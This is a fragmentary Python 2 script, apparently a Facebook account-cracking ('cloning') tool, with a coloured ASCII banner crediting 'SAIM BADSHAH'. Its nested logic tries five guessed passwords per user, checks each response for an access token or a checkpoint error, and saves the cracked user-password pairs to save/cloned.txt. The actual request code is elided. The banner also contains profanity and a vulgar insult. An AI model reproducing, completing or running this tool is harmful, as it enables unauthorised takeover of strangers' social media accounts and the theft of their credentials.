...
\033[1;92m_ooooo___________oo____________
\033[1;91moo___oo__ooooo_______oo_oo_oo__
\033[1;92m_oo_____oo___oo__oo__ooo_oo__o_
\033[1;96m___oo___oo___oo__oo__oo__oo__o_
\033[1;31moo___oo_oo___oo__oo__oo__oo__o_
\033[1;96m_ooooo___oooo_o_oooo_oo______o_
 \033[1;91m   FUCK YOU HATERS
 
 
 
\033[1;96m---------------------SAIM UR D4D---------------------
                
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m SAIM.                                
\033[0;91m║\033[0;91m FB :\033[0;92m "SAIM BADSHAH"                                             
\033[0;95m╰════════════════════════════════════════════╯
...
\033[1;96m------------------THE SAIM💜HACKER----------------------
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mSAIM BADSHAH .                                   
\033[0;91m║\033[0;91mWP No:\033[0;92m "APNI BAJI SY POUCH US KY PASS HAI"                                           
\033[0;95m╰════════════════════════════════════════════╯
 
\033[1;96m-----------------SAIM💜HACKER------------------------
"""
logo2 = """
...
\033[1;95mTAWADA OFFICAIL PAOO SAIM ”

                                                
\033[1;96m--------------------- SAIM BADSHAH --------------------
"""
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(SAIM OPEN)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(SAIM OPEN) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(SAIM OPEN)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(SAIM OPEN) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m(SAIM OPEN)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(SAIM OPEN) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(SAIM OPEN)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(SAIM OPEN) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(SAIM OPEN)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(SAIM OPEN) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
